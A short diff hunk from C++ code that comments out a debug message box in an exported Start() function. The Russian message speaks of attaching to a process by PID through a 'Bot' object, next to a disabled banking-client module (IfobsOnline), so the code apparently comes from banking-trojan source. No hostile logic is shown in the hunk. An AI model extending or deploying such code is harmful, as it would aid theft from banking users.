@@ -70,7 +70,7 @@ extern"C"  void WINAPI Start()
 	string Msg;
 	Msg.Format("1.12 Присоедините среду к процессу [PID:%d] %s", Bot->PID(), Bot->ApplicationName().t_str()); 
 
-	pMessageBoxA(NULL, Msg.t_str(), NULL, 0); 
+	//pMessageBoxA(NULL, Msg.t_str(), NULL, 0); 
 	
 //	IfobsOnline::Initialize(); 
 
